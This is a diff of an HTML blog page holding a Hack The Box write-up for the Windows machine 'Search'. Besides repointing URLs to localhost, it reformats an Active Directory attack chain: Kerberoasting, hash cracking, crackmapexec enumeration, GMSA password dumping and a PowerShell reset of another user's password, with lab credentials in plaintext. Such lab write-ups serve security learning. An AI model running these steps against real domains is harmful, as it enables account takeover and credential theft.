@@ -15,15 +15,15 @@
 <meta name="generator" content="Jekyll v4.2.2" />
 <meta property="og:title" content="HTB Writeup [Windows - Hard] - Search" />
 <meta property="og:locale" content="en_US" />
-<link rel="canonical" href="https://omnisl4sh.github.io/2022/06/28/Search.html" />
-<meta property="og:url" content="https://omnisl4sh.github.io/2022/06/28/Search.html" />
+<link rel="canonical" href="http://localhost:4000/2022/06/28/Search.html" />
+<meta property="og:url" content="http://localhost:4000/2022/06/28/Search.html" />
 <meta property="og:site_name" content="OmniSl4sh’s Blog" />
 <meta property="og:type" content="article" />
 <meta property="article:published_time" content="2022-06-28T00:00:00+02:00" />
 <meta name="twitter:card" content="summary" />
 <meta property="twitter:title" content="HTB Writeup [Windows - Hard] - Search" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-06-28T00:00:00+02:00","datePublished":"2022-06-28T00:00:00+02:00","headline":"HTB Writeup [Windows - Hard] - Search","mainEntityOfPage":{"@type":"WebPage","@id":"https://omnisl4sh.github.io/2022/06/28/Search.html"},"url":"https://omnisl4sh.github.io/2022/06/28/Search.html"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-06-28T00:00:00+02:00","datePublished":"2022-06-28T00:00:00+02:00","headline":"HTB Writeup [Windows - Hard] - Search","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2022/06/28/Search.html"},"url":"http://localhost:4000/2022/06/28/Search.html"}</script>
 <!-- End Jekyll SEO tag -->
 
     <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
@@ -43,7 +43,7 @@
     <div id="container">
       <div class="inner">
         <header>
-          <h1><a href="https://omnisl4sh.github.io/">OmniSl4sh's Blog</a></h1>
+          <h1><a href="http://localhost:4000/">OmniSl4sh's Blog</a></h1>
           <h2></h2>
         </header>
         <!--<<section id="downloads" class="clearfix">
@@ -217,7 +217,9 @@ Host script results:
 
 <p><strong>Note:</strong> it’s recommended to set your <strong>DNS</strong> server in <code class="language-plaintext highlighter-rouge">/etc/resolv.conf</code> to the box’s IP to make sure things go smoothly when using any of the tools we’re about to use.</p>
 
-<p><strong>Command:</strong> <code class="language-plaintext highlighter-rouge">python3 bloodhound.py -d search.htb -dc research.search.htb -u hope.sharp -p 'IsolationIsKey?'</code></p>
+<p><strong>Command:</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 bloodhound.py <span class="nt">-d</span> search.htb <span class="nt">-dc</span> research.search.htb <span class="nt">-u</span> hope.sharp <span class="nt">-p</span> <span class="s1">'IsolationIsKey?'</span>
+</code></pre></div></div>
 
 <p><img src="/assets/Search/bloodhound-py.jpg" alt="bloodhound-py" /></p>
 
@@ -234,13 +236,17 @@ Host script results:
 <h3 id="kerberoasting-web_svc">Kerberoasting <code class="language-plaintext highlighter-rouge">web_svc</code></h3>
 <p>we use impacket’s <code class="language-plaintext highlighter-rouge">GetUserSPNs.py</code></p>
 
-<p><strong>Command:</strong> <code class="language-plaintext highlighter-rouge">python3 GetUserSPNs.py -debug -request -dc-ip 10.10.11.129 search.htb/hope.sharp:'IsolationIsKey?'</code></p>
+<p><strong>Command:</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 GetUserSPNs.py <span class="nt">-debug</span> <span class="nt">-request</span> <span class="nt">-dc-ip</span> 10.10.11.129 search.htb/hope.sharp:<span class="s1">'IsolationIsKey?'</span>
+</code></pre></div></div>
 
 <p><img src="/assets/Search/kerberoasted.jpg" alt="kerberoasted" /></p>
 
 <p>And we crack the password using <code class="language-plaintext highlighter-rouge">john</code></p>
 
-<p><strong>Command:</strong> <code class="language-plaintext highlighter-rouge">john web_svc_hash -w=/usr/share/wordlists/rockyou.txt</code></p>
+<p><strong>Command:</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john web_svc_hash <span class="nt">-w</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt
+</code></pre></div></div>
 
 <p><img src="/assets/Search/cracked-with-john.jpg" alt="cracked-with-john" /></p>
 
@@ -251,7 +257,9 @@ Host script results:
 
 <p><em>In order to get a the full list of domain users,</em> I use <code class="language-plaintext highlighter-rouge">crackmapexec</code> with the <code class="language-plaintext highlighter-rouge">--users</code> flag.</p>
 
-<p><strong>Command:</strong> <code class="language-plaintext highlighter-rouge">crackmapexec smb 10.10.11.129 -u 'web_svc' -p '@3ONEmillionbaby' --users</code></p>
+<p><strong>Command:</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.11.129 <span class="nt">-u</span> <span class="s1">'web_svc'</span> <span class="nt">-p</span> <span class="s1">'@3ONEmillionbaby'</span> <span class="nt">--users</span>
+</code></pre></div></div>
 
 <p><img src="/assets/Search/cme-full-userlist.jpg" alt="cme-full-userlist" /></p>
 
@@ -262,7 +270,9 @@ Host script results:
 <h3 id="enumerating-smb-access-for-edgar">Enumerating SMB access for Edgar</h3>
 <p>We use <code class="language-plaintext highlighter-rouge">crackmapexec</code>’s <code class="language-plaintext highlighter-rouge">spider_plus</code> module to get a <em>nicely-formatted</em> <strong>JSON</strong> output for <code class="language-plaintext highlighter-rouge">edgar</code>’s share access.</p>
 
-<p><strong>Command:</strong> <code class="language-plaintext highlighter-rouge">crackmapexec smb 10.10.11.129 -u 'Edgar.Jacobs' -p '@3ONEmillionbaby' -M spider_plus</code></p>
+<p><strong>Command:</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.11.129 <span class="nt">-u</span> <span class="s1">'Edgar.Jacobs'</span> <span class="nt">-p</span> <span class="s1">'@3ONEmillionbaby'</span> <span class="nt">-M</span> spider_plus
+</code></pre></div></div>
 
 <p>We notice something interesting in the results:</p>
 
@@ -298,7 +308,9 @@ Host script results:
 <h3 id="reading-the-gmsa-password--resetting-tristans-password">Reading the GMSA password &amp; Resetting <code class="language-plaintext highlighter-rouge">tristan</code>’s password</h3>
 <p>We can obtain the <strong>NTLM</strong> hash of the <strong>GMSA</strong> <code class="language-plaintext highlighter-rouge">BIR-ADFS-GMSA$</code> with a <strong>python</strong> tool called <a href="/assets/Search/https://github.com/micahvandeusen/gMSADumper"><code class="language-plaintext highlighter-rouge">gMSADumper</code></a></p>
 
-<p><strong>Command:</strong> <code class="language-plaintext highlighter-rouge">python3 gMSADumper.py -u Sierra.Frye -p '$$49=wide=STRAIGHT=jordan=28$$18' -d search.htb</code></p>
+<p><strong>Command:</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 gMSADumper.py <span class="nt">-u</span> Sierra.Frye <span class="nt">-p</span> <span class="s1">'$$49=wide=STRAIGHT=jordan=28$$18'</span> <span class="nt">-d</span> search.htb
+</code></pre></div></div>
 
 <p><img src="/assets/Search/got-gmsa-ntlm.jpg" alt="got-gmsa-ntlm" /></p>
 
@@ -335,25 +347,25 @@ Host script results:
 
 <ol>
   <li>Obtain the <strong>GMSA</strong> password as a secure string. This can be done with the below command:
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$secstringpassword = (ConvertFrom-ADManagedPasswordBlob (get-adserviceaccount -filter * -Properties msDS-ManagedPassword).'msDS-ManagedPassword').SecureCurrentPassword
-</code></pre></div>    </div>
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$secstringpassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">ConvertFrom-ADManagedPasswordBlob</span><span class="w"> </span><span class="p">(</span><span class="n">get-adserviceaccount</span><span class="w"> </span><span class="nt">-filter</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="nx">msDS-ManagedPassword</span><span class="p">)</span><span class="o">.</span><span class="s1">'msDS-ManagedPassword'</span><span class="p">)</span><span class="o">.</span><span class="nf">SecureCurrentPassword</span><span class="w">
+</span></code></pre></div>    </div>
   </li>
   <li>Create a <code class="language-plaintext highlighter-rouge">PSCredential</code> object with both the <strong>GMSA</strong> username and the secure string.
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$cred = New-Object System.Management.Automation.PSCredential BIR-ADFS-GMSA, $secstringpassword
-</code></pre></div>    </div>
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$cred</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Management.Automation.PSCredential</span><span class="w"> </span><span class="nx">BIR-ADFS-GMSA</span><span class="p">,</span><span class="w"> </span><span class="nv">$secstringpassword</span><span class="w">
+</span></code></pre></div>    </div>
   </li>
   <li>Execute a password reset command using the created <code class="language-plaintext highlighter-rouge">PSCredential</code>:
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$Script = {Set-ADAccountPassword -Identity tristan.davies -reset -NewPassword (ConvertTo-SecureString -AsPlainText 'H@CKEDAGA1N!!' -force)}`
-Invoke-Command -ComputerName 127.0.0.1 -credential $cred -ScriptBlock $Script
-</code></pre></div>    </div>
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$Script</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="n">Set-ADAccountPassword</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">tristan.davies</span><span class="w"> </span><span class="nt">-reset</span><span class="w"> </span><span class="nt">-NewPassword</span><span class="w"> </span><span class="p">(</span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="s1">'H@CKEDAGA1N!!'</span><span class="w"> </span><span class="nt">-force</span><span class="p">)}</span><span class="w">
+</span><span class="n">Invoke-Command</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">127.0.0.1</span><span class="w"> </span><span class="nt">-credential</span><span class="w"> </span><span class="nv">$cred</span><span class="w"> </span><span class="nt">-ScriptBlock</span><span class="w"> </span><span class="nv">$Script</span><span class="w">
+</span></code></pre></div>    </div>
   </li>
   <li>Create another <code class="language-plaintext highlighter-rouge">PSCredential</code> object but with <code class="language-plaintext highlighter-rouge">tristan</code>’s new password:
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$killercreds = New-Object System.Management.Automation.PSCredential Tristan.Davies, (ConvertTo-SecureString -AsPlainText 'H@CKEDAGA1N!!' -force)`
-</code></pre></div>    </div>
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$killercreds</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Management.Automation.PSCredential</span><span class="w"> </span><span class="nx">Tristan.Davies</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="s1">'H@CKEDAGA1N!!'</span><span class="w"> </span><span class="nt">-force</span><span class="p">)</span><span class="w">
+</span></code></pre></div>    </div>
   </li>
   <li>Execute commands as <code class="language-plaintext highlighter-rouge">tristan</code> using the new credential object:
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Command -ComputerName 127.0.0.1 -credential $killercreds -ScriptBlock {whoami}
-</code></pre></div>    </div>
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-Command</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">127.0.0.1</span><span class="w"> </span><span class="nt">-credential</span><span class="w"> </span><span class="nv">$killercreds</span><span class="w"> </span><span class="nt">-ScriptBlock</span><span class="w"> </span><span class="p">{</span><span class="n">whoami</span><span class="p">}</span><span class="w">
+</span></code></pre></div>    </div>
   </li>
 </ol>
 
